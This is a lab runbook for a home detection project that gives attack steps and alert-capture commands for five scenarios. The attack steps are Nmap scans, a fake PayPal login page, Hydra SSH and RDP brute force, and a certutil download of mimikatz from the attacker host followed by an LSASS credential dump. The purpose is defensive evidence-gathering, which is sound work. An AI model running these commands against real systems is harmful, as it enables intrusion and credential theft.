# Evidence Capture Commands

Copy-paste commands to grab the proof for each scenario. Run the attack, wait for
the alert, then run the capture command. Screenshots are noted where a command
can't produce the artifact.

> **Before you start:** make sure the Wazuh agent is **Active**
> (`sudo /var/ossec/bin/agent_control -l` on the manager) and, for JSON capture,
> that JSON alert logging is on. If `/var/ossec/logs/alerts/alerts.json` doesn't
> exist, enable it in `ossec.conf` under `<alerts>`:
> `<jsonout_output>yes</jsonout_output>`, then `systemctl restart wazuh-manager`.
>
> `jq` makes the JSON readable: `sudo apt install jq` (manager).

---

## Scenario 01 — Nmap recon (Suricata)

Repeat the three steps for each scan type (`-sS`, `-sV`, `-A`), waiting ~1 minute
between scans. Replace `sS` in the filenames to match.

**1. Mark the log position (target):**
```bash
sudo wc -l /var/log/suricata/fast.log | awk '{print $1}' > ~/n-sS.txt
```

**2. Attack (Kali):**
```bash
# -n = no reverse DNS (Nmap 7.991 aborts in its DNS resolver without it)
sudo nmap -n -sS 192.168.56.20 | tee ~/nmap-sS.txt
```

**3. Capture only this scan's alerts and count them per signature (target, ~30 s later):**
```bash
N=$(cat ~/n-sS.txt)
sudo tail -n +$((N+1)) /var/log/suricata/fast.log | grep "192.168.56.10" > ~/fast-sS.txt
awk -F'\\[\\*\\*\\]' '{print $2}' ~/fast-sS.txt | sort | uniq -c | sort -rn | tee ~/sig-sS.txt
```

An empty `sig-*.txt` is a valid result (no detection). Do **not** use `tail -N` on
`fast.log` — it truncates the scan and hides earlier alerts.

**Check what `HOME_NET` covers (target)** — ET inbound rules only fire on sources
outside it:
```bash
grep -n "HOME_NET:" /etc/suricata/suricata.yaml
```

**Capture the Suricata alert as seen by Wazuh (manager):**
```bash
# Suricata alerts surface under base rule 86601
sudo grep '"id":"86601"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-01-nmap/wazuh-suricata-alert.json
```

**Screenshot:** optional — the dashboard filtered to `rule.groups: ids` →
`evidence/scenario-01-nmap/wazuh-suricata.png`

---

## Scenario 02 — Phishing IOC → SOAR

**Analysis (Kali):**
```bash
mkdir -p evidence/scenario-02-phishing
emlAnalyzer -i ~/paypal_phish.eml --header --html --url --text \
  | tee evidence/scenario-02-phishing/emlanalyzer-output.txt
```

**Serve the fake login page on the lab phishing server (Kali, bound to its own IP):**
```bash
# Add the phishing-server IP to the attack interface (replace eth0 as needed):
sudo ip address add 192.168.56.99/24 dev eth0
# Create the page the link points at. http.server is a STATIC file server rooted at
# the launch dir — without this file the callback returns 404 instead of 200:
mkdir -p ~/phish/paypal/login
cat > ~/phish/paypal/login/verify.php <<'EOF'
<!DOCTYPE html><html><body>
<h2>Account Verification</h2>
<form method="post">Email: <input name="email"><br>
Password: <input name="password" type="password"><br><button>Verify</button></form>
</body></html>
EOF
cd ~/phish && sudo python3 -m http.server 80 --bind 192.168.56.99
```

**Simulated click (target) — a victim host follows the phishing link:**
```bash
curl -m 5 http://192.168.56.99/paypal/login/verify.php
```

**Capture the IOC-match alert (manager) — fires in ~1-2s (http transaction event):**
```bash
sudo grep '"id":"100100"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-02-phishing/wazuh-100100-alert.json
```

**Enrichment capability — labeled synthetic test (target), carries a real known-bad
IP; no traffic is sent to it:**
```bash
TS=$(date -u +%Y-%m-%dT%H:%M:%S.000000+0000)
echo "{\"timestamp\":\"$TS\",\"in_iface\":\"enp0s3\",\"event_type\":\"http\",\"src_ip\":\"192.168.56.20\",\"dest_ip\":\"<known-bad-ip>\",\"dest_port\":80,\"proto\":\"TCP\",\"http\":{\"hostname\":\"<known-bad-ip>\",\"url\":\"/\"},\"lab_note\":\"SYNTHETIC TEST EVENT\"}" \
  | sudo tee -a /var/log/suricata/eve.json
# (add <known-bad-ip>:phishing_infrastructure to the CDB list + restart manager first)
```

**Screenshots (the SOAR half can't be captured by CLI).** The detection JSON `id`,
the Shuffle `$exec.id`, and the TheHive `Reference` must all be the **same** event ID
— that is what makes the chain verifiable.

*Real detection chain (the `.99` callback above):*
- Shuffle workflow run for that event → `evidence/scenario-02-phishing/shuffle-run-real.png`
- TheHive alert, **IOC attached as an observable** → `evidence/scenario-02-phishing/thehive-alert-real.png`
- TheHive observable (`192.168.56.99`) → `evidence/scenario-02-phishing/thehive-observable-real.png`
- (optional) the alert in the Wazuh dashboard → `evidence/scenario-02-phishing/wazuh-100100-discover.png`

*Synthetic enrichment demo (the known-bad-IP event — a separate event):*
- Shuffle run → `evidence/scenario-02-phishing/shuffle-run-synthetic.png`
- TheHive alert (`VT malicious: 20`) → `evidence/scenario-02-phishing/thehive-alert-synthetic.png`
- TheHive observable → `evidence/scenario-02-phishing/thehive-observable-synthetic.png`
- Manual VirusTotal web lookup of the known-bad IP → `evidence/scenario-02-phishing/virustotal-enrichment.png`

---

## Scenario 03 — SSH brute force

**Attack (Kali):**
```bash
hydra -l fakeuser -P ~/passwords.txt ssh://192.168.56.20 -t 4 | tee evidence/scenario-03-ssh/attack-output.txt
```

**Capture the correlation alert (manager):**
```bash
mkdir -p evidence/scenario-03-ssh
# newest SSH brute-force (5712) alert, pretty-printed
sudo grep '"id":"5712"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-03-ssh/alert-5712.json
# supporting failed-login (5710) alert
sudo grep '"id":"5710"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-03-ssh/alert-5710.json
```

**Screenshot:** the manager `alerts.log` tail or the dashboard showing 5710/5712 →
`evidence/scenario-03-ssh/wazuh-alerts.png`

---

## Scenario 04 — RDP brute force → lockout → compromise

**Attack (Kali):**
```bash
mkdir -p evidence/scenario-04-rdp
for pass in $(cat ~/winpass.txt); do
  echo "=== Trying: $pass ==="
  xfreerdp3 /u:Client /p:"$pass" /v:192.168.56.30 /cert:ignore +auth-only
done 2>&1 | tee evidence/scenario-04-rdp/attack-output.txt
```

**Capture the alerts (manager):**
```bash
# account lockout (60115)
sudo grep '"id":"60115"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-04-rdp/alert-60115.json
# the escalation — successful remote logon (92657)
sudo grep '"id":"92657"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-04-rdp/alert-92657.json
# a representative failed logon (60122)
sudo grep '"id":"60122"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-04-rdp/alert-60122.json
```

**Screenshot:** the three rules firing in sequence →
`evidence/scenario-04-rdp/wazuh-alerts.png`

> Tip: if `Client` is locked from a previous run, reset it on Windows:
> `net user Client <<new-password>> /active:yes`

---

## Scenario 05 — Credential dumping (Mimikatz / LSASS)

**Attack (Windows, in the compromised session; tool served from Kali with
`python3 -m http.server 80`):**
```powershell
# fetch the tool, renamed on disk to prove detection isn't name-based
certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
# dump credentials from LSASS
C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Capture the behavioral alert — rule 92900, the validated detection (manager):**
```bash
mkdir -p evidence/scenario-05-creddump
sudo grep '"id":"92900"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-05-creddump/wazuh-92900-alert.json
```

**Optional — capture the custom name-based rule 100002 (manager):**
```bash
sudo grep '"id":"100002"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-05-creddump/wazuh-100002-alert.json
```

**Screenshots:** the 92900 alert list and the detail showing
`sourceImage: m.exe → targetImage: lsass.exe`, `grantedAccess: 0x1010`, and MITRE
T1003.001 → `evidence/scenario-05-creddump/`.

---

## Redaction reminder

Before committing, scrub any public cloud IPs or credentials from the captured
files:

```bash
# dry-run: see what would match
grep -rInE "159\.203\.|142\.93\.|password|api[_-]?key|token" evidence/
```

Replace real cloud IPs with `<MANAGER_IP>` / `<THEHIVE_IP>` in any captured JSON
before publishing.
